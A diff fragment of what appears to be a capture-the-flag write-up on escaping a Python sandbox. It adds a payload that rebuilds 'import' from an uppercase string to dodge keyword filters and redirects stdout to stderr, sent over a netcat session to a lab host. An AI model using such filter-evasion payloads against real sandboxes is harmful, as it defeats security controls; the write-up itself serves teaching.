@@ -94,11 +94,12 @@ What should we do next? The program does close the standard output but it return
 >>> __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
 ```
 
-Now, the error is my standard output, which means any output is replacing the error output slot. By defining this line, the `print()` function will work successfully.
+Now, the standard error is my standard output, which means any output I want to print should replace the error field. By defining this line, the `print()` function will work successfully.
 
 ```
 $ nc 192.168.0.45 50137
-Please Input your Source code > 
+Please Input your Source code >
+__builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stdout'] = __builtins__.__dict__['__IMPORT__'.lower()]('SYS'.lower()).__dict__['stderr']
 print('anything')
 EOF
 
